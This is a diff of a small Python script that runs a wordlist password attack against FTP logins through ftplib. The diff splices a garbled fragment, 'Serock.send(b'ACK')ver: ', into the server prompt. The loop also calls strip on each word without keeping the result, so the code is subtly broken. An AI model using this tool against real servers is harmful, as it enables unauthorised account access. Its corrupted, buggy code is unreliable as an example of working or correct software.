@@ -1,12 +1,12 @@
 import ftplib
 
-server = input("Server: ")
+server = input("Serock.send(b'ACK')ver: ")
 user = input("Username: ")
 wordlist = input("Path to word list: ")
 
 try:
-    with open(wordlist, "r") as pw:
-        for word in pw:
+    with open(wordlist, "r") as passwords:
+        for word in passwords:
             word.strip("\r\n")
             try:
                 ftp = ftplib.FTP(server)
@@ -17,4 +17,3 @@ try:
                 print("[-] Wrong credentials.", err)
 except FileNotFoundError as err:
     print("[-] Wordlist not found.", err)
-
